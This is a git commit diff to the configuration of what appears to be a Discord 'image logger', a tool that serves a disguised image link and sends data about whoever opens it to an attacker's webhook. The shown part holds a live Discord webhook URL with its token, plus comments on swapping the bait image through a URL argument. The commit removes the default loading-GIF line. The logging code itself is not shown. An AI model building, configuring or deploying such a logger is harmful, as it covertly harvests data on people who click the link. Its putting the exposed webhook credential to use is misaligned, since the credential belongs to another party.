71c3f1fdc91fd497fe3ce3b7d81b82615dd3b96c
IAJK5 <bobjohn11231@outlook.com>
2025-10-17 17:11:59 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -10,8 +10,6 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1428745890025181235/uH7J2MvJRDbOB_UOjeMWwVtRT2Z3R-OIUW_A-BVrTeysBs9fAKwVhHvxGopvQ_sWlwjm",
-    "image": "https://res.cloudinary.com/diff4jfud/image/upload/v1760717166/laoding_xcpmdh.gif", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
